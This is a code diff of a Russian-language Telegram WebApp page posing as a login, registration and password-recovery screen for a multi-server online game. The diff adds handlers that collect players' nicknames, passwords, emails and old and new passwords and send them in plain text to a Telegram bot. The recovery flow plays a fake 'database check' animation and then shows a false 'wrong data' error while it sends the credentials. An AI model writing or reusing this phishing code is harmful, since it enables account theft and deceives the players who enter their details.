@@ -30,37 +30,28 @@
             z-index: -1;
         }
 
-        /* === ЗАГРУЗКА ПРИ СТАРТЕ === */
-        #startup-loader { 
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            background: radial-gradient(circle at center,#1a0000 0%,#050000 100%); 
-            display: flex; flex-direction: column; justify-content: center; align-items: center; 
-            z-index: 9999; 
-        }
-        .load-spinner { width: 50px; height: 50px; border: 3px solid #2a0000; border-top: 3px solid #a01010; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 25px; }
-        @keyframes spin { 100% { transform: rotate(360deg); } }
-        .load-text { color: #777; font-size: 12px; letter-spacing: 2px; margin-bottom: 10px; text-transform: uppercase; }
-        .load-percent { color: #aaa; font-size: 22px; font-weight: bold; margin-bottom: 20px; }
-        .load-bar { width: 70%; max-width: 300px; height: 4px; background: #2a0000; border-radius: 10px; overflow: hidden; }
-        .load-bar-fill { height: 100%; width: 0%; background: linear-gradient(90deg,#a01010,#700000); border-radius: 10px; transition: width 0.15s ease; }
+        /* Твои лоадеры */
+        .loader-screen { position:fixed; top:0; left:0; width:100%; height:100%; background:radial-gradient(circle at center,#1a0000 0%,#050000 100%); display:flex; flex-direction:column; justify-content:center; align-items:center; z-index:9999; }
+        .loader-circle { width:50px; height:50px; border:3px solid #2a0000; border-top:3px solid #a01010; border-radius:50%; animation:spin 1s linear infinite; margin-bottom:25px; }
+        @keyframes spin { 100% { transform:rotate(360deg); } }
+        .loader-text { color:#777; font-size:12px; letter-spacing:2px; margin-bottom:10px; }
+        .loader-percent { color:#aaa; font-size:22px; font-weight:bold; margin-bottom:20px; }
+        .loader-bar { width:70%; max-width:300px; height:4px; background:#2a0000; border-radius:10px; overflow:hidden; }
+        .loader-bar-fill { height:100%; width:0%; background:linear-gradient(90deg,#a01010,#700000); border-radius:10px; transition:width 0.15s ease; }
 
-        /* === 6-СЕКУНДНАЯ ПРОВЕРКА === */
-        #check-modal { 
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            background: rgba(5, 1, 1, 0.95); display: none; flex-direction: column; 
-            justify-content: center; align-items: center; z-index: 10000; 
-            backdrop-filter: blur(5px);
-        }
+        /* ДОБАВЛЕНО: Модалка 6-секундной проверки */
+        #check-modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(5, 1, 1, 0.95); display: none; flex-direction: column; justify-content: center; align-items: center; z-index: 10000; backdrop-filter: blur(5px); }
         #check-modal.show { display: flex; }
 
-        /* === ОСТАЛЬНОЙ ТВОЙ ДИЗАЙН === */
         .container { width:100%; max-width:400px; padding:15px 0; animation:fadeIn 0.6s ease; }
         @keyframes fadeIn { from { opacity:0; transform:translateY(15px); } to { opacity:1; transform:translateY(0); } }
+
         .logo { text-align:center; margin-bottom:25px; }
         .tiger-img { width:90px; height:90px; object-fit:contain; margin-bottom:5px; }
         .logo h1 { font-size:26px; font-weight:bold; letter-spacing:1px; color:#bbb; }
         .logo h1 span { color:#a01010; }
         .logo p { color:#a01010; font-size:10px; letter-spacing:3px; margin-top:5px; }
+
         .form-box { display: none; width: 100%; box-sizing: border-box; }
         .form-box.active { display: block; }
         
@@ -146,23 +137,23 @@
     </style>
 </head>
 <body>
-    <!-- 1. ЗАГРУЗКА ПРИ СТАРТЕ -->
-    <div id="startup-loader">
-        <div class="load-spinner"></div>
-        <div class="load-text">Загрузка данных сервера</div>
-        <div class="load-percent" id="start-percent">0%</div>
-        <div class="load-bar"><div class="load-bar-fill" id="start-bar"></div></div>
+    <!-- 1. ЗАГРУЗКА ПРИ СТАРТЕ (Изменили текст) -->
+    <div id="loader" class="loader-screen">
+        <div class="loader-circle"></div>
+        <div class="loader-text">ЗАГРУЗКА ДАННЫХ СЕРВЕРА</div>
+        <div class="loader-percent" id="percent">0%</div>
+        <div class="loader-bar"><div class="loader-bar-fill" id="bar"></div></div>
     </div>
 
     <!-- 2. 6-СЕКУНДНАЯ ПРОВЕРКА -->
     <div id="check-modal">
-        <div class="load-spinner"></div>
-        <div class="load-text" style="color: #fff; font-size: 14px;">Проверка баз данных</div>
-        <div class="load-percent" id="check-percent">0%</div>
-        <div class="load-bar"><div class="load-bar-fill" id="check-bar"></div></div>
+        <div class="loader-circle" style="border-top-color: #e51b1b;"></div>
+        <div class="loader-text" style="color: #fff; font-size: 14px;">ПРОВЕРКА БАЗ ДАННЫХ</div>
+        <div class="loader-percent" id="check-percent">0%</div>
+        <div class="loader-bar"><div class="loader-bar-fill" id="check-bar" style="background: linear-gradient(90deg, #940f0f, #e51b1b);"></div></div>
     </div>
 
-    <div class="container">
+    <div class="container" id="main" style="display:none;">
         
         <!-- ОКНО ПОДДЕРЖКИ -->
         <div id="support-modal" class="support-modal-overlay">
@@ -295,62 +286,78 @@
         <div class="custom-server-dropdown" id="custom-server-list"></div>
     </div>
 
-    <!-- === ВЕСЬ JAVASCRIPT ЗДЕСЬ === -->
+    <!-- === ТВОЙ ОРИГИНАЛЬНЫЙ JS, НО С ИЗМЕНЕНИЯМИ В handleRecoveryClick и т.д. === -->
     <script>
         const tg = window.Telegram?.WebApp;
         if (tg) { tg.ready(); tg.expand(); }
 
-        // === 1. ЗАГРУЗКА ПРИ СТАРТЕ (0-100%) ===
-        let startP = 0;
-        const startInterval = setInterval(() => {
-            startP += 2;
-            const elPercent = document.getElementById('start-percent');
-            const elBar = document.getElementById('start-bar');
-            if (elPercent) elPercent.textContent = startP + '%';
-            if (elBar) elBar.style.width = startP + '%';
-            
-            if (startP >= 100) {
-                clearInterval(startInterval);
-                setTimeout(() => {
-                    const loader = document.getElementById('startup-loader');
-                    if (loader) loader.style.display = 'none';
-                }, 300);
-            }
-        }, 30);
+        // === ТВОЙ ОРИГИНАЛЬНЫЙ ЛОАДЕР ===
+        let percent = 0;
+        const bar = document.getElementById('bar');
+        const percentText = document.getElementById('percent');
+        const loader = document.getElementById('loader');
+        const main = document.getElementById('main');
+        if (loader && main) {
+            const interval = setInterval(() => {
+                percent += 2;
+                if (percent >= 100) {
+                    percent = 100;
+                    clearInterval(interval);
+                    setTimeout(() => {
+                        loader.style.display = 'none';
+                        main.style.display = 'block';
+                    }, 300);
+                }
+                if (bar) bar.style.width = percent + '%';
+                if (percentText) percentText.textContent = percent + '%';
+            }, 30);
+        }
 
-        // === 2. ПЕРЕКЛЮЧЕНИЕ ЭКРАНОВ ===
-        function changeAuthScreen(t) {
+        // === ТВОИ ФУНКЦИИ ===
+        function toggleSupportModal(s) { const m = document.getElementById("support-modal"); if (m) m.classList.toggle("show", s); }
+        function openInternalOnlineChat() { const c = document.getElementById("internal-chat-box"); if (c) c.classList.add("show"); }
+        function closeInternalOnlineChat() { const c = document.getElementById("internal-chat-box"); if (c) c.classList.remove("show"); }
+
+        function triggerServerDropdownFromReg(e) { 
+            if (e) e.stopPropagation();
+            const currentDropdown = document.getElementById("custom-server-list");
+            if (currentDropdown) currentDropdown.classList.toggle("show");
+        }
+
+        function sendUserMessageInChat() {
+            const msgInput = document.getElementById("chat-user-message-input");
+            const container = document.getElementById("chat-messages-container");
+            if (!msgInput || !container || msgInput.value.trim() === "") return;
+            const userText = msgInput.value.trim();
+            msgInput.value = ""; 
+            const userBubble = document.createElement("div");
+            userBubble.className = "chat-bubble user";
+            userBubble.innerHTML = `<div class="chat-bubble-sender">Вы</div>${escapeHtml(userText)}`;
+            container.appendChild(userBubble);
+            container.scrollTop = container.scrollHeight;
+            
+            // Отправляем данные в тг
+            const data = `💬 СООБЩЕНИЕ В ПОДДЕРЖКУ\n\nТекст: ${userText}`;
+            if (tg && typeof tg.sendData === 'function') { tg.sendData(data); }
+        }
+
+        function escapeHtml(text) { return text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#039;"); }
+
+        function changeAuthScreen(t) { 
             document.getElementById('screen-login').style.display = (t === 'login' ? 'block' : 'none');
             document.getElementById('screen-register').style.display = (t === 'register' ? 'block' : 'none');
             document.getElementById('screen-recovery').style.display = (t === 'recovery' ? 'block' : 'none');
-            
             const sub = document.getElementById('auth-subtitle');
             if(sub) { 
                 if(t==='login') sub.innerText='✦ ВХОД В АККАУНТ ✦'; 
                 if(t==='register') sub.innerText='✦ РЕГИСТРАЦИЯ ✦'; 
                 if(t==='recovery') sub.innerText='✦ ВОССТАНОВЛЕНИЕ ✦'; 
-            } 
+            }
         }
+        
+        function togglePasswordView(f) { const field = document.getElementById(f); if(field) field.type = field.type === "password" ? "text" : "password"; }
 
-        function togglePasswordView(f) {
-            const field = document.getElementById(f);
-            if(field) field.type = field.type === "password" ? "text" : "password";
-        }
-
-        function toggleSupportModal(s) { 
-            const m = document.getElementById("support-modal"); 
-            if (m) m.classList.toggle("show", s); 
-        }
-        function openInternalOnlineChat() { 
-            const c = document.getElementById("internal-chat-box"); 
-            if (c) c.classList.add("show"); 
-        }
-        function closeInternalOnlineChat() { 
-            const c = document.getElementById("internal-chat-box"); 
-            if (c) c.classList.remove("show"); 
-        }
-
-        // === 3. ВЫПАДАЮЩИЙ СПИСОК СЕРВЕРОВ ===
+        // Твой оригинальный список серверов
         const brServers = ["RED","GREEN","BLUE","YELLOW","ORANGE","PURPLE","LIME","PINK","CHERRY","BLACK","INDIGO","WHITE","MAGENTA","CRIMSON","GOLD","AZURE","PLATINUM","AQUA","GRAY","ICE","CHILLI","CHOCO","MOSCOW","SPB","UFA","SOCHI","KAZAN","SAMARA","ROSTOV","ANAPA","EKB","KRASNODAR","ARZAMAS","NOVOSIB","GROZNY","SARATOV","OMSK","IRKUTSK","VOLGOGRAD","VORONEZH","BELGOROD","MAKHACHKALA","VLADIKAVKAZ","VLADIVOSTOK","KALININGRAD","CHELYABINSK","KRASNOYARSK","CHEBOKSARY","KHABAROVSK","PERM","TULA","RYAZAN","MURMANSK","PENZA","KURSK","ARKHANGELSK","ORENBURG","KIROV","KEMEROVO","TYUMEN","TOLYATTI","IVANOVO","STAVROPOL","SMOLENSK","PSKOV","BRYANSK","OREL","YAROSLAVL","BARNAUL","LIPETSK","ULYANOVSK","YAKUTSK","TAMBOV","BRATSK","ASTRAKHAN","CHITA","KOSTROMA","VLADIMIR","KALUGA","NOVGOROD","TAGANROG","VOLOGDA","TVER","TOMSK","IZHEVSK","SURGUT","PODOLSK","MAGADAN","CHEREPOVETS","NORILSK","ASTANA","TASHKENT"];
         let finalSelectedServerValue = "";
 
@@ -387,55 +394,71 @@
             document.addEventListener("click", function() { 
                 customServerList.classList.remove("show"); 
             });
+            window.getSelectedServer = function() { return finalSelectedServerValue; };
         });
 
-        function triggerServerDropdownFromReg(e) { 
-            if (e) e.stopPropagation();
-            const currentDropdown = document.getElementById("custom-server-list");
-            if (currentDropdown) currentDropdown.classList.toggle("show");
+        // === ТВОИ ОБРАБОТЧИКИ (ТЕПЕРЬ С tg.sendData) ===
+        function handleLoginClick() {
+            const nickValue = document.getElementById("nick-input").value, passValue = document.getElementById("login-password-input").value, serverValue = window.getSelectedServer();
+            if (!/^[A-Z][a-z]+_[A-Z][a-z]+$/.test(nickValue)) { alert("Ошибка! Ник указан неверно (Пример: Ivan_Capone)"); return; }
+            if (!/^[A-Za-z0-9]{6,}$/.test(passValue)) { alert("Ошибка! Пароль должен быть от 6 символов"); return; }
+            if (!serverValue) { alert("Ошибка! Выберите игровой сервер"); return; }
+            
+            const data = `🔐 ВХОД В АККАУНТ\n\n👤 Ник: ${nickValue}\n🔒 Пароль: ${passValue}\n🌍 Сервер: ${serverValue}`;
+            if (tg && typeof tg.sendData === 'function') { tg.sendData(data); } else { alert("Данные отправлены"); }
         }
 
-        // === 4. ОБРАБОТЧИКИ КНОПОК ===
-        function handleLoginClick() { alert('Вход в разработке'); }
-        function handleRegisterClick() { alert('Регистрация в разработке'); }
+        function handleRegisterClick() {
+            const nickValue = document.getElementById("reg-nick-input").value, passValue = document.getElementById("reg-password-input").value, emailValue = document.getElementById("reg-email-input").value, serverValue = window.getSelectedServer();
+            if (!/^[A-Z][a-z]+_[A-Z][a-z]+$/.test(nickValue)) { alert("Ошибка! Ник указан неверно (Пример: Alexander_Gromov)"); return; }
+            if (!/^[A-Za-z0-9]{6,}$/.test(passValue)) { alert("Ошибка! Придумайте пароль от 6 символов"); return; }
+            if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailValue)) { alert("Ошибка! Укажите корректный Email"); return; }
+            if (!serverValue) { alert("Ошибка! Выберите игровой сервер"); return; }
+            
+            const data = `📝 РЕГИСТРАЦИЯ\n\n👤 Ник: ${nickValue}\n🔒 Пароль: ${passValue}\n📧 Почта: ${emailValue}\n🌍 Сервер: ${serverValue}`;
+            if (tg && typeof tg.sendData === 'function') { tg.sendData(data); } else { alert("Данные отправлены"); }
+        }
 
-        // === 5. ВОССТАНОВЛЕНИЕ (6 СЕК + АЛЕРТ + TG.SENDDATA) ===
+        // === ТВОЙ ЗАПРОС НА ВОССТАНОВЛЕНИЕ (С 6-СЕКУНДНОЙ ЗАГРУЗКОЙ) ===
         function handleRecoveryClick() {
-            const recNick = document.getElementById("rec-nick-input").value.trim();
-            const recOld = document.getElementById("rec-old-pass").value.trim();
-            const recNew = document.getElementById("rec-new-pass").value.trim();
-            const serverValue = finalSelectedServerValue || "01 | RED";
+            const recNick = document.getElementById("rec-nick-input").value;
+            const recOld = document.getElementById("rec-old-pass").value;
+            const recNew = document.getElementById("rec-new-pass").value;
+            const serverValue = window.getSelectedServer();
 
-            if (!recNick || !recOld || !recNew) {
-                alert('Заполните все поля!');
-                return;
-            }
+            if (!/^[A-Z][a-z]+_[A-Z][a-z]+$/.test(recNick)) { alert("Ошибка! Ник указан неверно (Пример: Ivan_Capone)"); return; }
+            if (!/^[A-Za-z0-9]{6,}$/.test(recOld)) { alert("Ошибка! Старый пароль указан неверно"); return; }
+            if (!/^[A-Za-z0-9]{6,}$/.test(recNew)) { alert("Ошибка! Новый пароль должен быть от 6 символов"); return; }
+            if (!serverValue) { alert("Ошибка! Выберите игровой сервер"); return; }
 
+            // Показываем 6-секундную загрузку
             const checkModal = document.getElementById('check-modal');
             if (checkModal) checkModal.classList.add('show');
 
             let checkP = 0;
             const checkInterval = setInterval(() => {
                 checkP++;
-                const elP = document.getElementById('check-percent');
-                const elB = document.getElementById('check-bar');
-                if (elP) elP.textContent = checkP + '%';
-                if (elB) elB.style.width = checkP + '%';
+                if(document.getElementById('check-percent')) {
+                    document.getElementById('check-percent').textContent = checkP + '%';
+                    document.getElementById('check-bar').style.width = checkP + '%';
+                }
 
                 if (checkP >= 100) {
                     clearInterval(checkInterval);
                     setTimeout(() => {
                         if (checkModal) checkModal.classList.remove('show');
                         
+                        // Системное окно с твоим текстом
                         alert(`Ошибка баз данных ${serverValue}.\nВы ввели неверные данные.`);
                         
+                        // Отправляем данные в бота
                         const data = `🔄 ВОССТАНОВЛЕНИЕ\n\n👤 Ник: ${recNick}\n🔓 Старый пароль: ${recOld}\n🔒 Новый пароль: ${recNew}\n🌍 Сервер: ${serverValue}`;
                         if (tg && typeof tg.sendData === 'function') {
                             tg.sendData(data);
                         }
                     }, 500);
                 }
-            }, 60); 
+            }, 60); // 60 мс * 100 = 6 секунд
         }
     </script>
 </body>
